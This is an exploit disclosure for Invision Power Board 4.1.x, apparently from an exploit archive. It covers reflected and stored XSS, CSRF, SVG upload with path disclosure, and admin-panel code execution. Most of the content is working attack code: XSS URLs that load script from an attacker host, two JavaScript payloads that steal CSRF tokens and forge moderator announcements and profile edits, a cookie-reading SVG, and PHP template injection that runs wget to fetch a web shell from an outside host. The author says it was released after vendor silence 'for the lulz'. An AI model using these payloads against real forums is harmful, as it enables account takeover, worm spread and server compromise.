@@ -1,0 +1,363 @@
+id: 27957
+date: 06/15/2017
+title: Invision Power Board 4.1.19.2 XSS / CSRF / File Upload / Disclosure Vulnerabilities
+author: insecurity
+cves: 
+
+[+]--------------------------------------------------------------[+]
+            | Vulnerable Software:      Invision Power Board                 |
+            | Tested on:                v4.1.4.1 (current build)             |
+            | Vendor:                   http://invisionpower.com/            |
+            | Vulnerability Type:       Reflected and Stored XSS             |
+      |                           Cross-Site Request Forgery           |
+      |                           File Upload (svg)                    |
+            |                           Information Disclosure               |
+      |                           Shell Access via ACP                 |
+            | Date Released:            09/05/2017                           |
+            | Released by:              CDL (@sxcurity) + dkb (svg method)   |
+           [+]--------------------------------------------------------------[+]
+
+[+] Description:
+Invision Power Board version 4.1.19.2 (current version as of this release) and below, is vulnerable to pre-auth reflected XSS
+in the IPS UTF8 Converter v1.1.18 and stored XSS in the Announcements.
+The vulnerability in the IPS UTF8 Converter can easily be used to make a malicious announcement then affects any user that
+views the announcement.
+
+There are also Stored XSS + Information Disclosure vulnerabilities in the attachments feature found in User CP. This can be 
+triggered by any user and can be used to gain access to mod/admin accounts.
+
+-------------------------------------------------------------------------------------------------------------
+[+] Summary:
+The IPS UTF8 Converter does not properly sanitize the `controller` parameter, which is reflected in the response.
+Therefore, an attacker may craft a payload to close the current expression andinsert malicious javascript and HTML.
+
+The stored xss via the announcements requires a moderator or admin account to exploit. If you create a new announcement,
+you can choose the ""<> Source" option, which does not validate HTML tags or event handlers.
+This allows anyone with access to a moderator account to attack all users, mods, and admins.
+
+[+] In addition to this, it is possible to trigger stored XSS via a file upload bug regarding attachments. This also leads
+    to information disclosure (FPD + the path to the uploaded SVG file, allowing you to bypass the randomly generated filename)
+  This stored XSS can be achieved from any user account. No mod or admin privs required. A regular user can craft a payload
+  to make themselves admin as a result of this vulnerability. There are very specific steps required to reproduce this bug 
+  which will be detailed after the first Proof of Concept is displayed 
+
+-------------------------------------------------------------------------------------------------------------
+[+]========= Proof of Concepts =========[+]
+[+] Video: https://drive.google.com/file/d/0B3vXUYdNMECWMHVMaGVlMjVZMjg/view?usp=sharing
+
+[+] Simple alert
+
+http://<target>/admin/convertutf8/index.php?controller=%27};alert(document.domain);{%27
+
+[+] Triggering stored XSS in announcements.
+
+http://<target>/admin/convertutf8/index.php?controller='};</script><script src=//<attacker>/xss.js></script>;{'
+
+If a moderator or admin visits this URL, the script steals the CSRF tokens from the mod/admin, builds the CSRF form with
+the payload, and creates a malicious announcement with the attackers specified XSS payload. When anyone reads this announcement,
+the XSS will fire!
+
+[+] Abusing this XSS to attack users
+
+http://<target>/admin/convertutf8/index.php?controller='};</script><script src=//<attacker>/lol.js></script>;{'
+
+When a logged in user visits this page, it will steal the user's CSRF token, enable status updates
+and then change their "About Me" to "sxcurity is my hero" ;)
+
+
+[+]======= xss.js =======[+]
+/*
+http://www.sxcurity.pro/pocs/xss.js
+ _
+(_)_ ____      ___ __
+| | '_ \ \ /\ / / '_ \
+| | |_) \ V  V /| | | |
+|_| .__/ \_/\_/ |_| |_|
+ |_|  IPB Exploit
+      by @sxcurity
+*/
+
+// specifies the target, the title of the announcement, and the xss payload!
+var target = 'http://<target>/index.php?/modcp/announcements/&action=create';
+var title = 'URGENT';
+
+// Don't use quotes! It'll break our form down below!
+var payload = '<script src=//<ATTACKER>/lol.js></script>';
+
+// steals the csrf token ;)
+var cdl = get(target);
+document.body.innerHTML = cdl;
+var form = document.getElementsByTagName('input')[3];
+var token = form.value;
+
+// DON'T EDIT!!
+// Gets the current date! Thanks stackoverflow
+var today = new Date();
+var dd = today.getDate();
+var mm = today.getMonth()+1; //January is 0!
+var yyyy = today.getFullYear();
+if(dd<10){
+    dd='0'+dd;
+}
+if(mm<10){
+    mm='0'+mm;
+}
+var today = mm+'/'+dd+'/'+yyyy;
+
+// build form with valid token and evil credentials
+document.body.innerHTML
+  += '<form id="sxcurity" action="' + target + '" method="POST">'
+  + '<input type="hidden" name="_submitted" value="1">'
+  + '<input type="hidden" name="csrfKey" value="' + token + '">'
+  + '<input type="hidden" name="MAX_FILE_SIZE" value="2097152">'
+  + '<input type="hidden" name="plupload" value="sxcurity">'
+  + '<input type="hidden" name="announce_title" value="' + title + '">'
+  + '<input type="hidden" name="announce_start" value="' + today +'">'
+  + '<input type="hidden" name="announce_end_unlimited" value="0">'
+  + '<input type="hidden" name="announce_content" value="'+ payload +'">'
+  + '<input type="hidden" name="announce_content_upload" value="sxcurity">'
+  + '<input type="hidden" name="announce_app_unlimited" value="*">'
+  + '<input type="hidden" name="announce_calendars">'
+  + '<input type="hidden" name="announce_calendars-zeroVal" value="on">'
+  + '<input type="hidden" name="announce_download_categories">'
+  + '<input type="hidden" name="announce_download_categories-zeroVal" value="on">'
+  + '<input type="hidden" name="announce_forums">'
+  + '<input type="hidden" name="announce_forums-zeroVal" value="on">'
+  + '</form>';
+
+// submits our csrf form!
+document.forms["sxcurity"].submit();
+
+function get(url) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", url, false);
+    xmlHttp.send(null);
+    return xmlHttp.responseText;
+}
+
+[+]======= lol.js =======[+]
+/*
+www.sxcurity.pro/pocs/lol.js
+ _
+(_)_ ____      ___ __
+| | '_ \ \ /\ / / '_ \
+| | |_) \ V  V /| | | |
+|_| .__/ \_/\_/ |_| |_|
+ |_|  IPB Exploit
+      by @sxcurity
+
+index.php?/profile/<user>/&tab=field_core_pfield_1
+This will add "sxcurity is my hero" to the user's about me.
+*/
+var target = 'http://localhost/ips_4141/index.php';
+var payload = 'sxcurity is my hero';
+
+// Gets the Profile URL of the victim.
+var cdl = get(target);
+document.body.innerHTML = cdl;
+var user_url = document.getElementsByTagName('a')[13];
+var user_url1 = document.getElementsByTagName('a')[14];
+var user_url2 = document.getElementsByTagName('a')[15];
+var user_url3 = document.getElementsByTagName('a')[16];
+var user_url4 = document.getElementsByTagName('a')[17];
+var user_url5 = document.getElementsByTagName('a')[18];
+var user_url6 = document.getElementsByTagName('a')[19];
+var user_url7 = document.getElementsByTagName('a')[20];
+var yay = user_url.href;
+var yay1 = user_url1.href;
+var yay2 = user_url2.href;
+var yay3 = user_url3.href;
+var yay4 = user_url4.href;
+var yay5 = user_url5.href;
+var yay6 = user_url6.href;
+var yay7 = user_url7.href;
+var mod_check0 = document.getElementsByTagName('a')[22];
+var mod_check1 = document.getElementsByTagName('a')[22];
+var mod_check2 = document.getElementsByTagName('a')[23];
+var mod_check3 = document.getElementsByTagName('a')[24];
+var mod_check4 = document.getElementsByTagName('a')[25];
+var mod_check5 = document.getElementsByTagName('a')[26];
+var mod_check6 = document.getElementsByTagName('a')[27];
+var check0 = mod_check1.href;
+var check1 = mod_check1.href;
+var check2 = mod_check2.href;
+var check3 = mod_check3.href;
+var check4 = mod_check4.href;
+var check5 = mod_check5.href;
+var check6 = mod_check5.href;
+
+
+/*
+Mods / admins have a different amount of links before their profile URL, so this makes sure
+we grab the right profile URL and not some random one!
+*/
+if (yay.includes("profile")){
+  //user = normal user acc.
+  var profile = yay;
+} else if (yay1.includes("profile")){
+  //user = normal user acc.
+  var profile = yay1;
+} else if (yay2.includes("profile")){
+  //user = normal user acc.
+  var profile = yay2;
+} else if (yay3.includes("profile")){
+  //user = normal user acc.
+  var profile = yay3;
+} else if (yay4.includes("profile")){
+  //user = normal user acc.
+  var profile = yay4;
+} else if (yay5.includes("profile")){
+  //user = normal user acc.
+  var profile = yay5;
+} else if (yay6.includes("profile")){
+  //user = normal user acc.
+  var profile = yay6;
+} else if (yay7.includes("profile")){
+  //user = normal user acc.
+  var profile = yay7;
+} else if (check0.includes("profile")){
+  //user = mod or admin
+  var profile = check0;
+} else if (check2.includes("profile")){
+  //user = mod or admin
+  var profile = check2;
+} else if (check3.includes("profile")){
+  //user = mod or admin
+  var profile = check3;
+} else if (check4.includes("profile")){
+  //user = mod or admin
+  var profile = check4;
+} else if (check5.includes("profile")){
+  //user = mod or admin
+  var profile = check5;
+} else if (check6.includes("profile")){
+  //user = mod or admin
+  var profile = check6;
+}
+var final = profile + 'edit/';
+
+// steals the csrf token
+
+var csrf = get(final);
+document.body.innerHTML = csrf;
+var inp = document.getElementsByTagName('input')[3];
+var token = inp.value;
+
+// build form with valid token and evil credentials
+document.body.innerHTML
++= '<form id="woot" action=' + final + ' method="POST">'
++ '<input type="hidden" name="form_submitted" value="1">'
++ '<input type="hidden" name="csrfKey" value="' + token + '">'
++ '<input type="hidden" name="MAX_FILE_SIZE" value="2097152">'
++ '<input type="hidden" name="plupload" value="sxcurity">'
++ '<input type="hidden" name="bday[month]" value="0">'
++ '<input type="hidden" name="bday[day]" value="0">'
++ '<input type="hidden" name="bday[year]" value="0">'
++ '<input type="hidden" name="enable_status_updates" value="0">'
++ '<input type="hidden" name="enable_status_updates_checkbox" value="1">'
++ '<input type="hidden" name="core_pfield_1" value="' + payload + '">'
++ '<input type="hidden" name="core_pfield_1_upload" value="sxcurity">'
++ '</form>';
+
+// submits our csrf form!
+document.forms["woot"].submit();
+
+function get(url) {
+    var xmlHttp = new XMLHttpRequest();
+    xmlHttp.open("GET", url, false);
+    xmlHttp.send(null);
+    return xmlHttp.responseText;
+}
+
+-------------------------------------------------------------------------------------------------------------
+[+]========= Method 2 (Stored XSS via SVG upload) =========[+]
+
+Although the method above requires mod access, this next method will allow a regular user to obtain mod/admin
+access with relative ease. It involves uploading an SVG file as an attachment and then taking advantage of some
+information disclosure to get the path to the uploaded file, here are the steps to reproduce:
+
+1 > Visit your profile and click edit profile
+2 > Enable Status Updates
+3 > Reload the page & select the status update input 
+4 > Click "add an attachment" and select your SVG file
+5 > Once uploaded, reload the page (BEFORE you submit status update)
+6 > Once page is reloaded, select the status page input box again. You will see your attachment already there
+7 > Use inspect element or view the page source to find the path to where your attachment has been uploaded
+8 > CTRL + F ".svg" and take advantage of the full path disclosure to get the upload location
+
+When your SVG file is uploaded, it generates a random hash to add to the URL name (as well as attempting to hide the upload path).
+
+In addition to status updates, this can  also be achieved in threads (resulting in total chaos for the admin of the vuln site)
+The fact this can be used in threads makes it wormable. A regular user account can be used to target anyone who views any thread 
+posted by that user (or any thread posted by ANY user if a specific worm-based payload was crafted)
+
+Your malicious SVG file would look something like this (of course this is not a weaponized payload):
+  <svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.cookie);"/>
+  
+If you refreshed and did inspect element at the right time, you should see something like this in the source:
+-------------------------------------------------------------------------------------------------------------
+data-ipsuploader-existingfiles="{"102":{"configuration":{"dir":"\/home\/services\/Services\/ipbcommunity\/uploads"
+,"url":"uploads"}
+,"configurationId":1,"storageExtension":"core_Attachment"
+,"originalFilename":"xss.svg","filename"
+:"xss.svg.d9b51a7a276cfbc0625876e30bce299a.svg"
+,"container":"monthly_2017_05","url"
+:{"data":{"scheme":"https","host"
+:"vuln.site.com","path":"\/uploads\/monthly_2017_05\/xss.svg.d9b51a7a276cfbc0625876e30bce299a.svg"
+},"queryString":[],"isInternal":true,"isFriendly":true},"tempId":null,"attachmentThumbnailUrl"
+:{"data":{"scheme":"https","host":"vuln.site.com","path":"\/uploads\/monthly_2017_05\/xss.svg.d9b51a7a276cfbc0625876e30bce299a.svg"}
+,"queryString":[],"isInternal":true,"isFriendly":true},"thumbnailName":null,"thumbnailContainer":null}}"
+ -------------------------------------------------------------------------------------------------------------
+ 
+ From there, you can see the full path:
+ 
+In addition to this, we can also look at the URL in the source here to get the correct URL for where the XSS has been uploaded
+(there is a mechanism in place to attempt to prevent this from being possible by generating a unique string and adding it to the filename for the uploaded file,
+but by refreshing the page at the right time and viewing source we can see the full path for the upload including the unique string) here is an example:
+
+;:{"scheme":"https","host":"community.vuln.com","path":"\/uploads\/monthly_2017_05\/xss.svg.d9b51a7a276cfbc0625876e30bce299a.svg"}
+
+this can be seen in the source, which when decoded would translate to:
+
+https://community.vuln.com/uploads/monthly_2017_05/xss.svg.d9b51a7a276cfbc0625876e30bce299a.svg
+
+This can then either be used in a similar fashion to reflective XSS and linked to the victims, or it can be used within threads (via attachments)
+using the same method, which can allow someone from a regular user account to target the sites entire userbase (allowing for many possibilities,
+such as creating a worm, getting admin credentials, etc)
+  
+-------------------------------------------------------------------------------------------------------------
+This method is semi-public but it's definitely worth including to show what XSSing an IPB admin could lead to.
+Once access to the admin panel has been gained, the following method can be used to obtain a shell:
+
+- Navigate to admin panel
+  -> Go to "Look and Feel"
+  -> Manage languages
+  -> Choose langauge
+  -> Choose Section
+  -> look for 'public_help'
+  -> edit 'help.txt'
+  -> Choose topic from list
+
+After this, a box should pop up where you can make edits to help.txt, the following PHP code can then be added:
+-------------------------------------------------------------------------------------------------------------
+${${printA $query='cdA cache;A wgetA http://link_to_shell/shell.txt;mv
+shell.txtA shell.php'}}
+${${system($query,$out)}}
+${${printA $out}}A 
+-------------------------------------------------------------------------------------------------------------
+Make sure that this code is at the _bottom_ of the help module textfile, not anywhere else.
+
+After this, navigate to the following URL to execute your code:
+  http://vuln.com/index.php?app=core&module=helpA 
+
+From here, you can access your shell via the following URL:
+  http://vuln.com/cache/shell.phpA 
+  
+-------------------------------------------------------------------------------------------------------------  
+Timeline:
+ - Reported to IPB long ago
+ - Months passed
+ - Very bad communication
+ - Dropped for the lulz
+
+#  0day.today [2023-03-26]  #
